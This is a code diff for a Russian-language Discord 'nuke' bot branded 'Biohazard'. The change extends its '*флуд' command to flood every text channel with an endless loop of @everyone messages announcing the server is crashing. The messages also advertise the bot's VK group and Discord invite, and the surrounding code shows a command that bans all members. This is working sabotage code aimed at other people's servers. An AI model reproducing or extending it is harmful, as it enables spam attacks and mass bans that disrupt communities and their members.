@@ -7,7 +7,7 @@ print('Ожидание входа...')
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
-		await client.change_presence(activity = discord.Game('Крутой бот | v2.0'))
+		await client.change_presence(activity = discord.Game('Крутой бот | v2.1'))
 		
 	async def on_message(self, message):
 		c = 0
@@ -77,13 +77,14 @@ class MyClient(discord.Client):
 					pass
 				
 			if message.content == '*флуд': #флуд
-				await message.delete()
-				await asyncio.sleep(0.1)
-				try:
-					while True: #бесконечный цикл
-						await message.channel.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC') #отправка сообщения
-				except:
-					pass
+				for i in message.guild.text_channels:
+					await message.delete()
+					await asyncio.sleep(0.1)
+					try:
+						while True: #бесконечный цикл
+							await i.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC') #отправка сообщения
+					except:
+						pass
 				
 			if message.content == '*всембан': #бан всех участников
 				await message.delete()
